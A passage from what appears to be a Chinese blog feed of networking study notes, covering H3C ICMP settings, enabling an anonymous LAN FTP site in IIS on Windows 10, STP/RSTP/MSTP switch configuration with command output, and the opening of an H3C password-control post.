<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Enable sending of ICMP Time Exceeded packets</span><br><span class="line">[H3C]ip ttl-expires enable</span><br><span class="line"></span><br><span class="line"># Enable sending of ICMP Destination Unreachable packets</span><br><span class="line">[H3C]ip unreachables enable</span><br></pre></td></tr></table></figure>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li>H3C B00500050 VRRP</li>
</ol>
]]></content>
      <tags>
        <tag>信息网络</tag>
        <tag>H3C</tag>
        <tag>VRRP</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息网络学习day14 win10开启ftp服务】</title>
    <url>/1032/</url>
    <content><![CDATA[<p>在win10电脑上开启ftp服务，创建ftp站点，使局域网内其它pc可以访问。</p>
<span id="more"></span>

<h1 id="开启IIS服务"><a href="#开启IIS服务" class="headerlink" title="开启IIS服务"></a>开启IIS服务</h1><p>在<strong>控制面板-&gt;程序与功能</strong>中点击<strong>启用或关闭windows功能</strong>：</p>
<p><img src="/1032/1.PNG"></p>
<p>开启IIS中的<strong>FTP服务</strong>与<strong>IIS管理控制台</strong>：</p>
<p><img src="/1032/2.PNG"></p>
<h1 id="创建FTP站点"><a href="#创建FTP站点" class="headerlink" title="创建FTP站点"></a>创建FTP站点</h1><p>搜索框搜索<code>IIS</code>：</p>
<p><img src="/1032/3.PNG"></p>
<p>打开，用户名上右键创建FTP站点：</p>
<p><img src="/1032/4.PNG"></p>
<p>填写站点名字、挂载物理目录：</p>
<p><img src="/1032/5.PNG"></p>
<p>绑定和SSL设置中填写本机IP、无SSL：</p>
<p><img src="/1032/6.PNG"></p>
<p>身份验证和授权信息中选择允许匿名登录、授权所有用户，并给予权限：</p>
<p><img src="/1032/7.PNG"></p>
<p><strong>注意：确保挂载物理目录拥有较低权限，右键查看该文件夹属性-&gt;安全，如没有users等用户组时，新建一个everyone用户组，否则无法匿名登录。</strong></p>
<p><img src="/1032/8.PNG"></p>
<h1 id="防火墙设置"><a href="#防火墙设置" class="headerlink" title="防火墙设置"></a>防火墙设置</h1><p>搜索框搜防火墙，打开<strong>允许应用通过Windows防火墙</strong>：</p>
<p><img src="/1032/9.PNG"></p>
<p>勾选<strong>FTP服务</strong>的专用和公用框：</p>
<p><img src="/1032/10.PNG"></p>
<p>在<strong>允许其他应用</strong>里添加<code>C:\Windows\System32\svchost.exe</code>：</p>
<p><img src="/1032/11.PNG"></p>
<p>保存关闭即可。</p>
<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>现在本机可以通过任何一个本地ip访问ftp站点，局域网内其它机器可以通过我的ip访问ftp站点。</p>
<p>打开浏览器，输入<code>ftp://172.16.13.183</code>：</p>
<p><img src="/1032/12.PNG"></p>
]]></content>
      <tags>
        <tag>信息网络</tag>
        <tag>win10</tag>
        <tag>ftp</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息网络学习day15 H3C设备配置STP/RSTP/MSTP】</title>
    <url>/1033/</url>
    <content><![CDATA[<p>STP（Spanning Tree Protocol，生成树协议）是用于在局域网中消除数据链路层物理环路的协议。</p>
<p>STP 通过阻断冗余链路来消除桥接网络中可能存在的路径回环；而且在当前路径发生故障时，激活冗余备份链路，恢复网络连通性。</p>
<p>在H3C模拟器上进行STP等协议的配置，包括<strong>STP配置</strong>、<strong>RSTP配置</strong>、<strong>MSTP配置</strong>，系统版本v7。</p>
<span id="more"></span>

<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="STP"><a href="#STP" class="headerlink" title="STP"></a>STP</h2><h3 id="STP（生成树协议）"><a href="#STP（生成树协议）" class="headerlink" title="STP（生成树协议）"></a>STP（生成树协议）</h3><ul>
<li><p>STP（Spanning Tree Protocol，生成树协议）是用于在局域网中消除数据链路层物理环路的协议。</p>
</li>
<li><p>通过在桥之间交换BPDU（Bridge Protocol Data Unit，桥协议数据单元），来保证设备完成生成树的计算过程 。</p>
</li>
</ul>
<p><img src="/1033/1.PNG"></p>
<h3 id="BPDU（桥协议数据单元）"><a href="#BPDU（桥协议数据单元）" class="headerlink" title="BPDU（桥协议数据单元）"></a>BPDU（桥协议数据单元）</h3><ul>
<li>配置BPDU包含以下重要信息，完成生成树计算：</li>
</ul>
<ol>
<li>根桥ID（RootID）</li>
<li>根路径开销（RootPathCost）</li>
<li>指定桥ID（DesignatedBridgeID）</li>
<li>指定端口ID（ DesignatedPortID ）</li>
</ol>
<ul>
<li><p>各台设备的各个端口在初始时生成以自己为根桥（Root Bridge）的配置消息，向外发送自己的配置消息。</p>
</li>
<li><p>网络收敛后，根桥向外发送配置BPDU，其他的设备对该配置BPDU进行转发。</p>
</li>
</ul>
<h3 id="根桥的选举"><a href="#根桥的选举" class="headerlink" title="根桥的选举"></a>根桥的选举</h3><p><img src="/1033/2.PNG"></p>
<ul>
<li><p>桥ID由桥优先级（BridgePriority）和桥MAC地址（BridgeMacAddress）组成。</p>
</li>
<li><p>桥ID小的桥被选举为根桥。</p>
</li>
</ul>
<h3 id="端口角色的确定"><a href="#端口角色的确定" class="headerlink" title="端口角色的确定"></a>端口角色的确定</h3><p><img src="/1033/3.PNG"></p>
<ul>
<li><p>根桥上的所有端口为指定端口（ Designated Port ）</p>
</li>
<li><p>在非根桥上选举根路径开销（ RootPathCost）最小的端口为根端口（Root Port）</p>
</li>
<li><p>每个物理段选出根路径开销最小的桥作为指定桥（ Designated Bridge），连接指定桥的端口为指定端口</p>
</li>
<li><p>不是根端口和指定端口的其余端口被STP置为阻塞状态</p>
</li>
</ul>
<h4 id="通过桥ID决定端口角色"><a href="#通过桥ID决定端口角色" class="headerlink" title="通过桥ID决定端口角色"></a>通过桥ID决定端口角色</h4><p><img src="/1033/5.PNG"></p>
<ul>
<li><p>在根路径开销相同时，所连网段指定桥ID最小的端口为根端口</p>
</li>
<li><p>在根路径开销相同时，桥ID最小的桥被选举为物理段上的指定桥，连接指定桥的端口为指定端口</p>
</li>
</ul>
<h4 id="通过端口ID决定端口角色"><a href="#通过端口ID决定端口角色" class="headerlink" title="通过端口ID决定端口角色"></a>通过端口ID决定端口角色</h4><p><img src="/1033/6.PNG"></p>
<ul>
<li>在根路径开销、指定桥ID都相同的情况下，所连指定端口ID小的端口为根端口</li>
</ul>
<h3 id="根路径开销"><a href="#根路径开销" class="headerlink" title="根路径开销"></a>根路径开销</h3><p><img src="/1033/4.PNG"></p>
<ul>
<li><p>根路径开销（ RootPathCost）是到达根的路径上所有链路开销（Cost）的代数和</p>
</li>
<li><p>非根桥进行根端口选举时，根路径开销最小的端口为根端口</p>
</li>
<li><p>物理段进行指定桥选举时，路径开销最小的桥为指定桥</p>
</li>
</ul>
<h3 id="端口状态"><a href="#端口状态" class="headerlink" title="端口状态"></a>端口状态</h3><table>
<thead>
<tr>
<th>端口角色</th>
<th>端口状态</th>
<th>端口行为</th>
</tr>
</thead>
<tbody><tr>
<td>未启用STP功能的端口</td>
<td>Disabled</td>
<td>不收发BPDU报文，接收或转发数据</td>
</tr>
<tr>
<td>非指定端口或根端口</td>
<td>Blocking</td>
<td>接收但不发送BPDU，不接收或转发数据</td>
</tr>
<tr>
<td>–</td>
<td>Listening</td>
<td>接收并发送BPDU，不接收或转发数据</td>
</tr>
<tr>
<td>–</td>
<td>Learning</td>
<td>接收并发送BPDU，不接收或转发数据</td>
</tr>
<tr>
<td>指定端口或根端口</td>
<td>Forwarding</td>
<td>接收并发送BPDU，接收并转发数据</td>
</tr>
</tbody></table>
<h3 id="端口状态迁移"><a href="#端口状态迁移" class="headerlink" title="端口状态迁移"></a>端口状态迁移</h3><p><img src="/1033/7.PNG"></p>
<ul>
<li><p>端口被选为指定端口或根端口后，需要从Blocking状态经Listening和Learning才能到Forwarding状态。</p>
</li>
<li><p>默认的Forwarding Delay时间是15秒。</p>
</li>
</ul>
<h3 id="生成树的不足"><a href="#生成树的不足" class="headerlink" title="生成树的不足"></a>生成树的不足</h3><ul>
<li><p>端口从阻塞状态进入转发状态必须经历两倍的Forwarding Delay时间。</p>
</li>
<li><p>如果网络中的拓扑结构变化频繁，网络会频繁地失去连通性。</p>
</li>
</ul>
<p><img src="/1033/8.PNG"></p>
<h2 id="RSTP"><a href="#RSTP" class="headerlink" title="RSTP"></a>RSTP</h2><ul>
<li><p>RSTP（Rapid Spanning Tree Protocol，快速生成树协议）是STP协议的优化版</p>
</li>
<li><p>RSTP具备STP的所有功能</p>
</li>
<li><p>RSTP可以实现快速收敛</p>
</li>
<li><p>在某些情况下，端口进入转发状态的延时大大缩短，从而缩短了网络最终达到拓扑稳定所需要的时间。</p>
</li>
</ul>
<p>RSTP的改进：</p>
<table>
<thead>
<tr>
<th></th>
<th>STP行为</th>
<th>RSTP行为</th>
</tr>
</thead>
<tbody><tr>
<td>端口被选为根端口</td>
<td>默认情况下，2倍的Forwarding Delay的时间延迟。</td>
<td>存在阻塞的备份根端口情况下，仅有数毫秒延迟。</td>
</tr>
<tr>
<td>端口被选为指定端口</td>
<td>默认情况下，2倍的Forwarding Delay的时间延迟。</td>
<td>1.在指定端口是非边缘端口的情况下，延迟取决因素较多。2.在指定端口是边缘端口的情况下，指定端口可以直接进入转发状态，没有延迟。</td>
</tr>
</tbody></table>
<h2 id="MSTP"><a href="#MSTP" class="headerlink" title="MSTP"></a>MSTP</h2><h3 id="STP、RSTP的问题"><a href="#STP、RSTP的问题" class="headerlink" title="STP、RSTP的问题"></a>STP、RSTP的问题</h3><ul>
<li><p>Trunk链路上实际上运行着多个VLAN</p>
</li>
<li><p>所有VLAN共用一棵生成树</p>
</li>
<li><p>无法实现不同VLAN在多条Trunk链路上的负载分担</p>
</li>
</ul>
<p><img src="/1033/9.PNG"></p>
<h3 id="多生成树协议"><a href="#多生成树协议" class="headerlink" title="多生成树协议"></a>多生成树协议</h3><ul>
<li><p>MSTP（Multiple Spanning Tree Protocol，多生成树协议）</p>
</li>
<li><p>将多个VLAN捆绑到一个实例，每个实例生成独立的生成树</p>
</li>
<li><p>在多条Trunk链路上实现VLAN级负载分担</p>
</li>
</ul>
<p><img src="/1033/10.PNG"></p>
<h2 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h2><h3 id="协议特性比较"><a href="#协议特性比较" class="headerlink" title="协议特性比较"></a>协议特性比较</h3><table>
<thead>
<tr>
<th>特性列表</th>
<th>STP</th>
<th>RSTP</th>
<th>MSTP</th>
</tr>
</thead>
<tbody><tr>
<td>解决环路故障并实现冗余备份</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>快速收敛</td>
<td></td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>形成多棵生成树实现负载分担</td>
<td></td>
<td></td>
<td>Y</td>
</tr>
</tbody></table>
<ul>
<li><p>MSTP具有RSTP的快速收敛，同时又具有负载分担机制</p>
</li>
<li><p>MSTP兼容STP和RSTP</p>
</li>
</ul>
<h3 id="端口状态对比"><a href="#端口状态对比" class="headerlink" title="端口状态对比"></a>端口状态对比</h3><p><img src="/1033/11.PNG"></p>
<h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><h2 id="STP-1"><a href="#STP-1" class="headerlink" title="STP"></a>STP</h2><h3 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h3><p>按照下图拓扑连线，并配置各PC机的IP：</p>
<p><img src="/1033/12.PNG"></p>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>分别在各交换机上启用stp：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SW1]stp mode stp</span><br><span class="line">[SW1]stp global enable</span><br><span class="line"></span><br><span class="line">[SW2]stp mode stp</span><br><span class="line">[SW2]stp global enable</span><br><span class="line"></span><br><span class="line">[SW3]stp mode stp</span><br><span class="line">[SW3]stp global enable</span><br></pre></td></tr></table></figure>

<p>配置完成后，稍等一会，查看各交换机的stp状态信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SW1]dis stp brief</span><br><span class="line"> MST ID   Port                                Role  STP State   Protection</span><br><span class="line"> 0        GigabitEthernet1/0/1                DESI  FORWARDING  NONE</span><br><span class="line"> 0        GigabitEthernet1/0/2                DESI  FORWARDING  NONE</span><br><span class="line"> 0        GigabitEthernet1/0/3                DESI  FORWARDING  NONE</span><br><span class="line">[SW1]dis stp</span><br><span class="line">-------[CIST Global Info][Mode STP]-------</span><br><span class="line"> Bridge ID           : 32768.4653-dab0-0100</span><br><span class="line"> Bridge times        : Hello 2s MaxAge 20s FwdDelay 15s MaxHops 20</span><br><span class="line"> Root ID/ERPC        : 32768.4653-dab0-0100, 0</span><br><span class="line"> RegRoot ID/IRPC     : 32768.4653-dab0-0100, 0</span><br><span class="line"> RootPort ID         : 0.0</span><br><span class="line"> BPDU-Protection     : Disabled</span><br><span class="line"> Bridge Config-</span><br><span class="line"> Digest-Snooping     : Disabled</span><br><span class="line"> TC or TCN received  : 7</span><br><span class="line"> Time since last TC  : 0 days 0h:5m:25s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[SW2]dis stp brief</span><br><span class="line"> MST ID   Port                                Role  STP State   Protection</span><br><span class="line"> 0        GigabitEthernet1/0/1                DESI  FORWARDING  NONE</span><br><span class="line"> 0        GigabitEthernet1/0/2                ROOT  FORWARDING  NONE</span><br><span class="line"> 0        GigabitEthernet1/0/3                DESI  FORWARDING  NONE</span><br><span class="line">[SW2]dis stp</span><br><span class="line">-------[CIST Global Info][Mode STP]-------</span><br><span class="line"> Bridge ID           : 32768.4653-e0b3-0200</span><br><span class="line"> Bridge times        : Hello 2s MaxAge 20s FwdDelay 15s MaxHops 20</span><br><span class="line"> Root ID/ERPC        : 32768.4653-dab0-0100, 20</span><br><span class="line"> RegRoot ID/IRPC     : 32768.4653-e0b3-0200, 0</span><br><span class="line"> RootPort ID         : 128.3</span><br><span class="line"> BPDU-Protection     : Disabled</span><br><span class="line"> Bridge Config-</span><br><span class="line"> Digest-Snooping     : Disabled</span><br><span class="line"> TC or TCN received  : 9</span><br><span class="line"> Time since last TC  : 0 days 0h:8m:0s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[SW3]dis stp brief</span><br><span class="line"> MST ID   Port                                Role  STP State   Protection</span><br><span class="line"> 0        GigabitEthernet1/0/1                DESI  FORWARDING  NONE</span><br><span class="line"> 0        GigabitEthernet1/0/2                ALTE  DISCARDING  NONE</span><br><span class="line"> 0        GigabitEthernet1/0/3                ROOT  FORWARDING  NONE</span><br><span class="line">[SW3]dis stp</span><br><span class="line">-------[CIST Global Info][Mode STP]-------</span><br><span class="line"> Bridge ID           : 32768.4653-e784-0300</span><br><span class="line"> Bridge times        : Hello 2s MaxAge 20s FwdDelay 15s MaxHops 20</span><br><span class="line"> Root ID/ERPC        : 32768.4653-dab0-0100, 20</span><br><span class="line"> RegRoot ID/IRPC     : 32768.4653-e784-0300, 0</span><br><span class="line"> RootPort ID         : 128.4</span><br><span class="line"> BPDU-Protection     : Disabled</span><br><span class="line"> Bridge Config-</span><br><span class="line"> Digest-Snooping     : Disabled</span><br><span class="line"> TC or TCN received  : 18</span><br><span class="line"> Time since last TC  : 0 days 0h:7m:22s</span><br></pre></td></tr></table></figure>

<p>可见STP运行模式为<strong>STP</strong>，<code>SW3</code>的<strong>G1&#x2F;0&#x2F;2</strong>口被阻塞为备用端口。</p>
<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>模拟网络连线中断，将<code>SW1</code>与<code>SW2</code>所连线路删掉，刚断线时PC1ping不通PC2。</p>
<p>查看stp状态：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SW1]dis stp brief</span><br><span class="line"> MST ID   Port                                Role  STP State   Protection</span><br><span class="line"> 0        GigabitEthernet1/0/1                DESI  FORWARDING  NONE</span><br><span class="line"> 0        GigabitEthernet1/0/3                DESI  FORWARDING  NONE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[SW2]dis stp brief</span><br><span class="line"> MST ID   Port                                Role  STP State   Protection</span><br><span class="line"> 0        GigabitEthernet1/0/1                DESI  FORWARDING  NONE</span><br><span class="line"> 0        GigabitEthernet1/0/3                DESI  FORWARDING  NONE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[SW3]dis stp brief</span><br><span class="line"> MST ID   Port                                Role  STP State   Protection</span><br><span class="line"> 0        GigabitEthernet1/0/1                DESI  FORWARDING  NONE</span><br><span class="line"> 0        GigabitEthernet1/0/2                DESI  DISCARDING  NONE</span><br><span class="line"> 0        GigabitEthernet1/0/3                ROOT  FORWARDING  NONE</span><br></pre></td></tr></table></figure>

<p>大约30秒左右后，PC1可以ping通PC2。</p>
<h2 id="RSTP-1"><a href="#RSTP-1" class="headerlink" title="RSTP"></a>RSTP</h2><h3 id="拓扑-1"><a href="#拓扑-1" class="headerlink" title="拓扑"></a>拓扑</h3><p>拓扑图同上。</p>
<h3 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h3><p>分别在各交换机上启用rstp：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SW1]stp mode rstp</span><br><span class="line">[SW1]stp global enable</span><br><span class="line"></span><br><span class="line">[SW2]stp mode rstp</span><br><span class="line">[SW2]stp global enable</span><br><span class="line"></span><br><span class="line">[SW3]stp mode rstp</span><br><span class="line">[SW3]stp global enable</span><br></pre></td></tr></table></figure>

<p>配置完成后，稍等一会，查看各交换机的stp状态信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SW1]dis stp brief</span><br><span class="line"> MST ID   Port                                Role  STP State   Protection</span><br><span class="line"> 0        GigabitEthernet1/0/1                DESI  FORWARDING  NONE</span><br><span class="line"> 0        GigabitEthernet1/0/2                DESI  FORWARDING  NONE</span><br><span class="line"> 0        GigabitEthernet1/0/3                DESI  FORWARDING  NONE</span><br><span class="line">[SW1]dis stp</span><br><span class="line">-------[CIST Global Info][Mode RSTP]-------</span><br><span class="line"> Bridge ID           : 32768.4653-dab0-0100</span><br><span class="line"> Bridge times        : Hello 2s MaxAge 20s FwdDelay 15s MaxHops 20</span><br><span class="line"> Root ID/ERPC        : 32768.4653-dab0-0100, 0</span><br><span class="line"> RegRoot ID/IRPC     : 32768.4653-dab0-0100, 0</span><br><span class="line"> RootPort ID         : 0.0</span><br><span class="line"> BPDU-Protection     : Disabled</span><br><span class="line"> Bridge Config-</span><br><span class="line"> Digest-Snooping     : Disabled</span><br><span class="line"> TC or TCN received  : 10</span><br><span class="line"> Time since last TC  : 0 days 0h:1m:5s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[SW2]dis stp brief</span><br><span class="line"> MST ID   Port                                Role  STP State   Protection</span><br><span class="line"> 0        GigabitEthernet1/0/1                DESI  FORWARDING  NONE</span><br><span class="line"> 0        GigabitEthernet1/0/2                ROOT  FORWARDING  NONE</span><br><span class="line"> 0        GigabitEthernet1/0/3                DESI  FORWARDING  NONE</span><br><span class="line">[SW2]dis stp</span><br><span class="line">-------[CIST Global Info][Mode RSTP]-------</span><br><span class="line"> Bridge ID           : 32768.4653-e0b3-0200</span><br><span class="line"> Bridge times        : Hello 2s MaxAge 20s FwdDelay 15s MaxHops 20</span><br><span class="line"> Root ID/ERPC        : 32768.4653-dab0-0100, 20</span><br><span class="line"> RegRoot ID/IRPC     : 32768.4653-e0b3-0200, 0</span><br><span class="line"> RootPort ID         : 128.3</span><br><span class="line"> BPDU-Protection     : Disabled</span><br><span class="line"> Bridge Config-</span><br><span class="line"> Digest-Snooping     : Disabled</span><br><span class="line"> TC or TCN received  : 62</span><br><span class="line"> Time since last TC  : 0 days 0h:0m:46s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[SW3]dis stp brief</span><br><span class="line"> MST ID   Port                                Role  STP State   Protection</span><br><span class="line"> 0        GigabitEthernet1/0/1                DESI  FORWARDING  NONE</span><br><span class="line"> 0        GigabitEthernet1/0/2                ALTE  DISCARDING  NONE</span><br><span class="line"> 0        GigabitEthernet1/0/3                ROOT  FORWARDING  NONE</span><br><span class="line">[SW3]dis stp</span><br><span class="line">-------[CIST Global Info][Mode RSTP]-------</span><br><span class="line"> Bridge ID           : 32768.4653-e784-0300</span><br><span class="line"> Bridge times        : Hello 2s MaxAge 20s FwdDelay 15s MaxHops 20</span><br><span class="line"> Root ID/ERPC        : 32768.4653-dab0-0100, 20</span><br><span class="line"> RegRoot ID/IRPC     : 32768.4653-e784-0300, 0</span><br><span class="line"> RootPort ID         : 128.4</span><br><span class="line"> BPDU-Protection     : Disabled</span><br><span class="line"> Bridge Config-</span><br><span class="line"> Digest-Snooping     : Disabled</span><br><span class="line"> TC or TCN received  : 77</span><br><span class="line"> Time since last TC  : 0 days 0h:0m:50s</span><br></pre></td></tr></table></figure>

<p>可见STP运行模式为<strong>RSTP</strong>，<code>SW3</code>的<strong>G1&#x2F;0&#x2F;2</strong>口被阻塞为备用端口。</p>
<h3 id="验证-1"><a href="#验证-1" class="headerlink" title="验证"></a>验证</h3><p>模拟网络连线中断，将<code>SW1</code>与<code>SW2</code>所连线路删掉，刚断线时PC1ping不通PC2。</p>
<p>经测试：</p>
<ul>
<li>断SW1与SW2线，PC1ping通PC2所用时间较STP模式稍快一些，区别不是很大；</li>
<li>重连SW1与SW2线，RSTP模式下几乎感受不到网络中断。</li>
</ul>
<h2 id="MSTP-1"><a href="#MSTP-1" class="headerlink" title="MSTP"></a>MSTP</h2><h3 id="拓扑-2"><a href="#拓扑-2" class="headerlink" title="拓扑"></a>拓扑</h3><p>按照下图拓扑连线，并创建相应vlan、设置trunk端口属性：</p>
<p><img src="/1033/13.PNG"></p>
<p>组网需求：</p>
<ol>
<li>网络中所有设备都属于同一个MST域。SWA和SWB为汇聚层设备，SWC和SWD为接入层设备。</li>
<li>通过配置使不同VLAN的报文按照不同的MSTI转发：VLAN 10的报文沿MSTI 1转发，VLAN 30沿MSTI 3转发，VLAN 40沿MSTI 4转发，VLAN 20沿MSTI 0转发。</li>
<li>由于VLAN 10和VLAN 30在汇聚层设备终结、VLAN 40在接入层设备终结，因此配置MSTI 1和MSTI 3的根桥分别为SWA和SWB，MSTI 4的根桥为SWC。</li>
</ol>
<h3 id="配置-2"><a href="#配置-2" class="headerlink" title="配置"></a>配置</h3><p>在各交换机配置MST域并应用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># SWA配置MST域的域名为example，将VLAN 10、30、40分别映射到MSTI 1、3、4上，并配置MSTP的修订级别为0。</span><br><span class="line">[SWA]stp region-configuration</span><br><span class="line">[SWA-mst-region]region-name example</span><br><span class="line">[SWA-mst-region]instance 1 vlan 10</span><br><span class="line">[SWA-mst-region]instance 3 vlan 30</span><br><span class="line">[SWA-mst-region]instance 4 vlan 40</span><br><span class="line">[SWA-mst-region]active region-configuration</span><br><span class="line">[SWA-mst-region]quit</span><br><span class="line"># 配置本设备为MSTI 1的根桥</span><br><span class="line">[SWA]stp instance 1 root primary</span><br><span class="line">[SWA]stp global enable</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># SWB配置MST域的域名为example，将VLAN 10、30、40分别映射到MSTI 1、3、4上，并配置MSTP的修订级别为0。</span><br><span class="line">[SWB]stp region-configuration</span><br><span class="line">[SWB-mst-region]region-name example</span><br><span class="line">[SWB-mst-region]instance 1 vlan 10</span><br><span class="line">[SWB-mst-region]instance 3 vlan 30</span><br><span class="line">[SWB-mst-region]instance 4 vlan 40</span><br><span class="line">[SWB-mst-region]active region-configuration</span><br><span class="line">[SWB-mst-region]quit</span><br><span class="line"># 配置本设备为MSTI 0及MSTI 3的根桥</span><br><span class="line">[SWB]stp instance 0 root primary</span><br><span class="line">[SWB]stp instance 3 root primary</span><br><span class="line">[SWB]stp global enable</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># SWC配置MST域的域名为example，将VLAN 10、30、40分别映射到MSTI 1、3、4上，并配置MSTP的修订级别为0。</span><br><span class="line">[SWC]stp region-configuration</span><br><span class="line">[SWC-mst-region]region-name example</span><br><span class="line">[SWC-mst-region]instance 1 vlan 10</span><br><span class="line">[SWC-mst-region]instance 3 vlan 30</span><br><span class="line">[SWC-mst-region]instance 4 vlan 40</span><br><span class="line">[SWC-mst-region]active region-configuration</span><br><span class="line">[SWC-mst-region]quit</span><br><span class="line"># 配置本设备为MSTI 4的根桥</span><br><span class="line">[SWC]stp instance 4 root primary</span><br><span class="line">[SWC]stp global enable</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># SWD配置MST域的域名为example，将VLAN 10、30、40分别映射到MSTI 1、3、4上，并配置MSTP的修订级别为0。</span><br><span class="line">[SWD]stp region-configuration</span><br><span class="line">[SWD-mst-region]region-name example</span><br><span class="line">[SWD-mst-region]instance 1 vlan 10</span><br><span class="line">[SWD-mst-region]instance 3 vlan 30</span><br><span class="line">[SWD-mst-region]instance 4 vlan 40</span><br><span class="line">[SWD-mst-region]active region-configuration</span><br><span class="line">[SWD-mst-region]quit</span><br><span class="line"></span><br><span class="line">[SWD]stp global enable</span><br></pre></td></tr></table></figure>

<h3 id="验证-2"><a href="#验证-2" class="headerlink" title="验证"></a>验证</h3><p>当网络拓扑稳定后，查看各设备上生成树的简要信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SWA]dis stp brief</span><br><span class="line"> MST ID   Port                                Role  STP State   Protection</span><br><span class="line"> 0        GigabitEthernet1/0/1                DESI  FORWARDING  NONE</span><br><span class="line"> 0        GigabitEthernet1/0/2                DESI  FORWARDING  NONE</span><br><span class="line"> 0        GigabitEthernet1/0/3                ROOT  FORWARDING  NONE</span><br><span class="line"> 1        GigabitEthernet1/0/1                DESI  FORWARDING  NONE</span><br><span class="line"> 1        GigabitEthernet1/0/3                DESI  FORWARDING  NONE</span><br><span class="line"> 3        GigabitEthernet1/0/2                DESI  FORWARDING  NONE</span><br><span class="line"> 3        GigabitEthernet1/0/3                ROOT  FORWARDING  NONE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[SWB]dis stp brief</span><br><span class="line"> MST ID   Port                                Role  STP State   Protection</span><br><span class="line"> 0        GigabitEthernet1/0/1                DESI  FORWARDING  NONE</span><br><span class="line"> 0        GigabitEthernet1/0/2                DESI  FORWARDING  NONE</span><br><span class="line"> 0        GigabitEthernet1/0/3                DESI  FORWARDING  NONE</span><br><span class="line"> 1        GigabitEthernet1/0/2                DESI  FORWARDING  NONE</span><br><span class="line"> 1        GigabitEthernet1/0/3                ROOT  FORWARDING  NONE</span><br><span class="line"> 3        GigabitEthernet1/0/1                DESI  FORWARDING  NONE</span><br><span class="line"> 3        GigabitEthernet1/0/3                DESI  FORWARDING  NONE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[SWC]dis stp brief</span><br><span class="line"> MST ID   Port                                Role  STP State   Protection</span><br><span class="line"> 0        GigabitEthernet1/0/1                ALTE  DISCARDING  NONE</span><br><span class="line"> 0        GigabitEthernet1/0/2                ROOT  FORWARDING  NONE</span><br><span class="line"> 0        GigabitEthernet1/0/3                DESI  FORWARDING  NONE</span><br><span class="line"> 1        GigabitEthernet1/0/1                ROOT  FORWARDING  NONE</span><br><span class="line"> 1        GigabitEthernet1/0/2                ALTE  DISCARDING  NONE</span><br><span class="line"> 4        GigabitEthernet1/0/3                DESI  FORWARDING  NONE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[SWD]dis stp brief</span><br><span class="line"> MST ID   Port                                Role  STP State   Protection</span><br><span class="line"> 0        GigabitEthernet1/0/1                ROOT  FORWARDING  NONE</span><br><span class="line"> 0        GigabitEthernet1/0/2                ALTE  DISCARDING  NONE</span><br><span class="line"> 0        GigabitEthernet1/0/3                ALTE  DISCARDING  NONE</span><br><span class="line"> 3        GigabitEthernet1/0/1                ROOT  FORWARDING  NONE</span><br><span class="line"> 3        GigabitEthernet1/0/2                ALTE  DISCARDING  NONE</span><br><span class="line"> 4        GigabitEthernet1/0/3                ROOT  FORWARDING  NONE</span><br></pre></td></tr></table></figure>

<p>根据上述显示信息，可以绘出各VLAN所对应的MSTI，如下图所示。</p>
<p><img src="/1033/14.PNG"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li>H3C X00030003 第13章 生成树协议</li>
<li>H3C S5820X[S5800]系列以太网交换机 配置指导-Release 1211-6W100 二层技术-以太网交换配置指导 MSTP配置-新华三集团-H3C(<a href="http://www.h3c.com/cn/d_201109/724938_30005_0.htm">http://www.h3c.com/cn/d_201109/724938_30005_0.htm</a>)</li>
</ol>
]]></content>
      <tags>
        <tag>信息网络</tag>
        <tag>H3C</tag>
        <tag>STP</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息网络学习 H3C设备配置密码管理】</title>
    <url>/1034/</url>
    <content><![CDATA[<p>Password Control（密码管理）是本地认证服务器提供的密码安全功能，它根据设置的策略对密码进行控制。</p>
<p>在H3C模拟器上进行密码管理的配置，系统版本v7。</p>
<span id="more"></span>

<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>密码管理功能实现的密码安全策略包括：</p>
<ol>
<li>密码最小长度限制</li>
<li>密码更新间隔时间管理</li>
<li>密码老化管理</li>
<li>密码过期提醒</li>
<li>密码老化后允许登录管理</li>
<li>密码历史记录</li>
<li>密码尝试次数限制</li>
<li>密码的组合检测功能</li>
<li>密码的复杂度检测功能</li>
<li>密码回显为“****”</li>
<li>认证超时管理</li>
<li>用户帐号闲置时间管理</li>
<li>日志功能</li>
</ol>
